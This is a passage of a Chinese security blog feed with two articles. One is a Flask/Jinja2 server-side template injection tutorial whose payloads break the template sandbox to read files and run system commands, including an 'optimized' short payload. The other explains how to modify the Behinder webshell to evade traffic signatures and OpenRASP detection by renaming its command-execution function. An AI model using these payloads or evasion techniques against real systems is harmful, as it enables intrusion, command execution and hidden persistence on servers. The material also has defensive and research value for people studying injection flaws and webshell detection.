+<pre><code>name=&#123;&#123;().__class__.__name__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image14.png" alt="pic8"></p>
+<p>成功获取 “()” 的类型 tuple（元组） 。我们知道 Python<br>中所有类型的其实都是 object 类型，所以下面我们继续尝试： 获取到 object<br>类型：</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__name__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image15.png" alt="pic9"></p>
+<p>获取到 object 的所有子类：</p>
+<pre><code>name=&#123;&#123;''.__class__.__mro__[1].__subclasses__().__name__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image16.png" alt="pic10"></p>
+<p>发现子类型有很多，在这里我们需要找到内建模块中含有 eval 或者 open<br>的类型来使我们可以执行代码或读取文件。 查找脚本如下：</p>
+<pre><code>code = &#39;eval&#39;             # 查找包含 eval 函数的内建模块的类型
+i = 0
+for c in ().__class__.__base__.__subclasses__():
+    if hasattr(c,&#39;__init__&#39;) and hasattr(c.__init__,&#39;__globals__&#39;) and c.__init__.__globals__[&#39;__builtins__&#39;] and c.__init__.__globals__[&#39;__builtins__&#39;][code]:
+        print(&#39;&#123;&#125; &#123;&#125;&#39;.format(i,c))
+    i = i + 1
+</code></pre>
+<p>运行结果：</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image17.png" alt="pic11"></p>
+<p>在Python 2/3 版本中有这么多类型的内建模块中都包含 eval<br>。这里为了让最后的结果同时兼容 Python 2/3 版本我们使用索引为 77 的类型：<br>class ‘site.Quitter’ 。</p>
+<p>我们看看在这个 class ‘site.Quitter’ 的 global 环境下都可以执行那些函数：</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image18.png" alt="pic12"></p>
+<p>可以看到几个敏感函数<br>eval、open、file等等，应有尽有。这样我们就可以做很多我们想做的事了。</p>
+<p>执行代码 abs(-1):</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']('abs(-1)')&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image19.png" alt="pic13"></p>
+<p>看到 abs(-1)<br>已经执行成功，至此我们已经成功绕过了沙箱，执行了本不可执行的代码。</p>
+<p><strong>常用可兼容Python 2/3 版本的 Payload：</strong><br>读取文件：</p>
+<pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['open']("C:\Windows\win.ini").read()&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image20.png" alt="pic20"></p>
+<p>命令执行：</p>
+<pre><code>&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image21.png" alt="pic21"></p>
+<p>是不是觉得这些 Payload<br>有些长了呢？那么有没有什么办法可以缩减一些长度呢？</p>
+<h2 id="0x04-解锁新姿势"><a href="#0x04-解锁新姿势" class="headerlink" title="0x04 解锁新姿势"></a>0x04 解锁新姿势</h2><h3 id="无意中的尝试"><a href="#无意中的尝试" class="headerlink" title="无意中的尝试"></a>无意中的尝试</h3><p>当我在编写脚本和将 Payload<br>输入浏览器的时候，因手误无意中组成了一个错误的 Payload ：</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__().c.__init__.__globals__['__builtins__']['eval']('abs(-1)')&#125;&#125;
+</code></pre>
+<p>执行结果：</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image22.png" alt="pic14"></p>
+<p>竟然访问成功了！</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image23.jpeg"></p>
+<p>那么为什么会访问成功呢？</p>
+<p>().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() 理应返回的是 object<br>类型的所有子类的列表，是不应该包含 c 这个属性的。</p>
+<p>理论上应该造成服务端错误返回 500 ，服务器日志显示 AttributeError: ‘list’<br>object has no attribute ‘c’。但是结果却是成功执行了，这让我意识到 jinja2<br>的沙箱环境，跟普通 Python 运行环境还是有很多不同的。</p>
+<p>既然这样的话我们就看下这个 c 对象的 <strong>init</strong> 函数到底是个啥？</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__().c.__init__&#125;&#125;
+</code></pre>
+<p>执行结果： <img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image24.png" alt="pic15"></p>
+<p>竟然是一个 Undefined 类型，也就是说如果碰到未定义的变量就会返回为<br>Undefined 类型.而 Python 官方库是没有这个类型的，也就是说明这个<br>Undefined 是 jinja2 框架提供的。 我们在 jinja2 框架的源码中搜寻，最后在<br>runtime.py 中找到了 Undefined 这个 class：</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image25.png" alt="pic16"></p>
+<p>继承的是 object 类型，并且还有其他函数。 为了确认是这个 class<br>我们尝试使用 _fail_with_undefined_error ：</p>
+<pre><code>name=&#123;&#123;().__class__.__base__.__subclasses__().c._fail_with_undefined_error&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image26.png" alt="pic17"></p>
+<p>OK，确认过眼神，我遇见对的class !</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image27.jpeg"></p>
+<p>既然都是 Undefined 那我随便定义一个未被定义过的变量也应该是 Undefined ：</p>
+<pre><code>name=&#123;&#123;a.__init__.__globals__.__builtins__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image28.png" alt="pic18"></p>
+<p>既然 Undefined 类可以执行成功，那我们就可以看看他的全局 global<br>的内建模块中都包含什么了：</p>
+<pre><code>name=&#123;&#123;a.__init__.__globals__.__builtins__&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image29.png" alt="pic19"></p>
+<p>老样子，还是可以看到几个敏感函数 eval、open 等等，应有尽有。</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image30.jpeg"></p>
+<h3 id="优化-Payload"><a href="#优化-Payload" class="headerlink" title="优化 Payload"></a>优化 Payload</h3><p>对此我们直接优化我们的 Payload，使长度大大缩短，可读性也变强了。</p>
+<p><strong>优化后的兼容 Python 2/3 版本的 Payload：</strong><br>读取文件：</p>
+<pre><code>&#123;&#123;a.__init__.__globals__.__builtins__.open("C:\Windows\win.ini").read()&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image31.png" alt="pic22"></p>
+<p>命令执行：</p>
+<pre><code>&#123;&#123;a.__init__.__globals__.__builtins__.eval("__import__('os').popen('whoami').read()")&#125;&#125;
+</code></pre>
+<h2 id="0x05-最后"><a href="#0x05-最后" class="headerlink" title="0x05 最后"></a>0x05 最后</h2><p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image33.jpeg"></p>
+<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
+      <categories>
+        <category>原创文章</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>模板注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>冰蝎，从入门到魔改（续）</title>
+    <url>/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本篇文章是<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247485811&idx=1&sn=dfe68ca403b7009e2f41e622dd2b690f">《冰蝎，从入门到魔改》</a>的续篇。有小伙伴读过上一篇文章后联系笔者，说只介绍了 PHP 版本的特征擦除，希望可以获知其它语言版本的特征擦除思路和方法。本篇首先简单介绍一下上一篇文章中的通用流量特征点及擦除后的效果，再着重介绍在对”冰蝎”JSP 版和 ASP 版的魔改中碰到的问题及流量监测/规避的方法思路。</p>
+<h2 id="0x02-通用篇"><a href="#0x02-通用篇" class="headerlink" title="0x02 通用篇"></a>0x02 通用篇</h2><p>本章节简单的介绍一下 PHP、JSP、ASP 版本”冰蝎”的通用特征，具体原理和修改思路可以参考上一篇文章：<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247485811&idx=1&sn=dfe68ca403b7009e2f41e622dd2b690f">《冰蝎，从入门到魔改》</a></p>
+<h3 id="密钥交换时的URL参数"><a href="#密钥交换时的URL参数" class="headerlink" title="密钥交换时的URL参数"></a>密钥交换时的URL参数</h3><p><strong>特征：</strong></p>
+<p>密钥交换式 Webshell 默认密码为 pass，并且参数值为 3 位随机数字。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image1.png"></p>
+<p><strong>修改版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image2.png"></p>
+<h3 id="header中的Content-Type"><a href="#header中的Content-Type" class="headerlink" title="header中的Content-Type"></a>header中的Content-Type</h3><p><strong>特征：</strong></p>
+<p>GET 形式访问会携带 Content-type 字段，并且内容固定。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image3.png"></p>
+<p><strong>修改版：</strong></p>
+<p>GET请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image4.png"></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image5.png"></p>
+<h3 id="header中的User-Agent"><a href="#header中的User-Agent" class="headerlink" title="header中的User-Agent"></a>header中的User-Agent</h3><p><strong>特征：</strong></p>
+<p>内置 17 个较旧 的User-Agent。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image6.png"></p>
+<p><strong>修改版：</strong></p>
+<p>2020 年发布的 Firefox 75.0：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image7.png"></p>
+<p>2019 年 11 月发布的 Chrome 78.0.3904.108：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image8.png"></p>
+<h3 id="header中的Accept"><a href="#header中的Accept" class="headerlink" title="header中的Accept"></a>header中的Accept</h3><p><strong>特征：</strong></p>
+<p>Accept 字段为固定非常见值。</p>
+<p><strong>原版：</strong></p>
+<p>GET请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image9.png"></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image10.png"></p>
+<p><strong>修改版：</strong></p>
+<p>GET请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image11.png"></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image12.png"></p>
+<h3 id="二次密钥获取"><a href="#二次密钥获取" class="headerlink" title="二次密钥获取"></a>二次密钥获取</h3><p><strong>特征：</strong></p>
+<p>至少两次的 GET 形式获取密钥的过程。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image13.png"></p>
+<p><strong>修改版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image14.png"></p>
+<h3 id="response中返回密钥"><a href="#response中返回密钥" class="headerlink" title="response中返回密钥"></a>response中返回密钥</h3><p><strong>特征：</strong></p>
+<p>密钥返回是直接以 16 位字符的形式返回到客户端，Content-Length 固定为 16。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image15.png"></p>
+<p><strong>修改版：</strong></p>
+<p>直接访问：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image16.png"></p>
+<p>流量侧：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image17.png"></p>
+<h3 id="header中的Cookie"><a href="#header中的Cookie" class="headerlink" title="header中的Cookie"></a>header中的Cookie</h3><p><strong>特征：</strong></p>
+<p>Cookie 中携带非常规的 Path 参数内容。</p>
+<p><strong>原版：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image18.png"></p>
+<p><strong>修改后的效果：</strong></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image19.png"></p>
+<h2 id="0x03-JSP篇"><a href="#0x03-JSP篇" class="headerlink" title="0x03 JSP篇"></a>0x03 JSP篇</h2><h3 id="Webshell免杀原理"><a href="#Webshell免杀原理" class="headerlink" title="Webshell免杀原理"></a>Webshell免杀原理</h3><p>首先看下 JSP 版的 Webshell 代码，大体逻辑如下：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image20.png"></p>
+<p>可以看到将客户端发来的字节码转为类并实例化，之后调用了 equals 函数。 equals 函数默认为 Object 的函数，是比较两个对象的内存地址，在 JAVA 代码中非常常见的函数，所以整个 Webshell 看起来人畜无害。</p>
+<p>我们看下客户端中的相关代码，首先通过 getData 函数来获取发送的数据：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image21.png"></p>
+<p>getParamedClass 函数为将类转为字节码的关键函数：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image22.png"></p>
+<p>被转成字节码的 Cmd 类，其中 cmd 参数为执行命令的字符串：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image23.png"></p>
+<p>可以看到，Cmd 类中将 equals 函数重写了，内部中调用了 RunCMD 。而 RunCMD 实际就是使用 Runtime.getRuntime().exec 执行系统命令，并将输出返回。</p>
+<h3 id="header中的Content-Type-1"><a href="#header中的Content-Type-1" class="headerlink" title="header中的Content-Type"></a>header中的Content-Type</h3><p>JSP版本连接的时候，客户端的请求包中的 Content-Type 为 application/octet-stream ，意思是客户端传输的为字节流。如果未有此相关业务，可作为一个较明显的监测特征。</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image24.png"></p>
+<p><strong>修改思路：</strong></p>
+<p>POST形式访问时将值改为 Content-Type 值改为 “text/html; charset=utf-8” 或者 “text/x-www-form-urlencoded; charset=utf-8” 以规避安全检测。</p>
+<p>看Webshell中的代码是直接读取了一整行的数据，所以改成其它类型也是没关系的。</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image25.png"></p>
+<p><strong>修改后的效果：</strong></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image26.png"></p>
+<h3 id="对抗RASP"><a href="#对抗RASP" class="headerlink" title="对抗RASP"></a>对抗RASP</h3><p><strong>什么是RASP？</strong></p>
+<p>RASP 英文为 Runtime application self-protection，即实时应用自我保护。它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序和应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遇到特定漏洞和攻击时不需要人工干预就可以进行自动重新配置应对新的攻击。</p>
+<p>此理念的众多产品，其中比较有名的开源项目叫做 OpenRASP 。 OpenRASP 是可以监测冰蝎后门的，不论 Webshell 如何免杀变形，OpenRASP 基于命令执行的调用堆栈来识别冰蝎：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image27.png"></p>
+<p>hah~ 这里提到了只要客户端代码不变，就可以检测到，但是我们既然是魔改就肯定会改代码的~</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image28.jpg"></p>
+<p>先来看下”冰蝎”连接 Webshell 后运行命令 whoami 的结果，在部署好 OpenRASP 后运行，可以在 tomcatroot/rasp/logs/alarm/alarm.log 文件中查到告警日志：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image29.png"></p>
+<p>我们可以看到，OpenRASP监测到了调用堆栈，冰蝎识别出了命令”cmd.exe /c whoami” 。</p>
+<p><strong>修改思路：</strong></p>
+<p>网上能查到的规避方案是修改包名，将 net.rebeyond.behinder 这三层包名修改或去掉。但是我们要知其然还要知其所以然。</p>
+<p>在更深入的了解 OpenRASP 的检测功能后我们发现，OpenRASP 的检测逻辑部分是由 JavaScript 语言实现的，原因是为了避免多平台上的重新实现。官方对此也有所说明：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image30.png"></p>
+<p>官方的检测逻辑在 <tomcatroot>/rasp/plugins/official.js 中，我们来查看这个文件并找出了检测调用堆栈的部分：</tomcatroot></p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image31.png"></p>
+<p>可以看到多种检测堆栈关键字的漏洞，如：fastjson 反序列化、ElasticSearch Groovy 的 RCE 等。在该文件第866行我们找到了”冰蝎”的检测关键字：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net.rebeyond.behinder.payload.java.Cmd.RunCMD</span><br></pre></td></tr></table></figure>
+<p>关键字检测精确到了函数名 RunCMD。</p>
+<p>既然如此我们没有必要大张旗鼓地修改包名（还要修改调用资源的路径，非常麻烦），我们只需要修改 RunCMD 函数的名称就可以规避 OpenRASP 的检测。</p>
+<p><strong>修改后的效果：</strong></p>
+<p>我们修改好函数名后重新编译，并将服务器中的 alarm.log 告警日志清空后重启。</p>
+<p>客户端执行 whoami：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image32.png"></p>
+<p>服务端 OpenRASP 无法检测到该条命令执行，告警日志为空：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image33.png"></p>
+<h2 id="0x04-ASP篇"><a href="#0x04-ASP篇" class="headerlink" title="0x04 ASP篇"></a>0x04 ASP篇</h2><h3 id="魔改中的小坑"><a href="#魔改中的小坑" class="headerlink" title="魔改中的小坑"></a>魔改中的小坑</h3><p>在 ASP 版本的 Webshell 有个小坑。</p>
+<p>我们直接使用魔改之后的版本进行连接会报错：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image34.png"></p>
+<p>我们抓包看下：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image35.png"></p>
+<p>服务端返回状态码 500，服务器内部错误。</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image36.jpeg"></p>
+<p>其实这个坑点是在密钥交换的 GET 请求中，判断密码参数（默认为 pass 的字段）是否存在。</p>
+<p>代码如下:</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image37.png"></p>
+<p>在原版本中 pass 的值为随机 3 位数字，在 C# 语法中数字可以作为If判断的条件（0 为 False，其它数字为  True）。但是在我们的魔改版本中 pass 的值为了规避监测设置为了随机字符串。 C# 中字符串类型无法作为 If 的判断条件，会报类型不匹配的错误：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image38.png"></p>
+<p>我们需要将 Webshell 稍微改下，判断 pass 的值不为空字符串即可解决此问题。</p>
